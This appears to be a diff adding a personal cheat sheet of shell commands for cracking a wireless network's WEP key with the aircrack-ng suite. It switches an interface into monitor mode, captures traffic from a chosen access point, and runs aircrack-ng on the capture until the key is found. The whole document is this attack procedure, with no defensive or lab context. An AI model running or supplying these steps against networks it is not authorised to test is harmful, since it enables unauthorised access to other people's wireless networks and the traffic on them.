@@ -1,0 +1,10 @@
+#iwconfig
+#ifconfig wlan0 down
+#airmon-ng check kill
+#iwconfig wlan0 mode monitor or #airmon-ng start wlan0
+#ifconfig wlan0 up 
+#iwconfig
+#airodump-ng [MonitorModeInterface]   // get WEP AP from the output
+#airodump-ng --bssid <BSSID> --channel <CHANNEL> --write <fileName> [MonitorModeInterface]
+** while keeping the below capturing running, go to the directory where fileName.cap is saved and run below command to crack the key
+#aircrack-ng fileName.cap     // in the outout check for KEY FOUND!
